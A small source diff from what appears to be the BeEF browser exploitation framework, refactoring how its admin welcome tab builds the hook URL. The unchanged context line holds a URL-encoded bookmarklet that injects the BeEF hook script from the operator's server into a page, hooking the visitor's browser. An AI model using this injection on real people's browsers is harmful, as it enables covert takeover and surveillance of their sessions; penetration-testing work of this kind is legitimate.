@@ -7,12 +7,7 @@
 WelcomeTab = function() {
 
   <%
-    @configuration = BeEF::Core::Configuration.instance
-    beef_proto = @configuration.get("beef.http.https.enable") == true ? "https" : "http";
-    beef_host = @configuration.get("beef.http.public") || @configuration.get("beef.http.host")
-    beef_port = @configuration.get("beef.http.public_port") || @configuration.get("beef.http.port")
-    beef_hook = @configuration.get("beef.http.hook_file")
-    hook_url = "#{beef_proto}://#{beef_host}:#{beef_port}/#{beef_hook}"
+    hook_url = BeEF::Core::Configuration.instance.hook_url
   %>
 
     var bookmarklet = "javascript:%20(function%20()%20{%20var%20url%20=%20%27<%= hook_url %>%27;if%20(typeof%20beef%20==%20%27undefined%27)%20{%20var%20bf%20=%20document.createElement(%27script%27);%20bf.type%20=%20%27text%2fjavascript%27;%20bf.src%20=%20url;%20document.body.appendChild(bf);}})();"
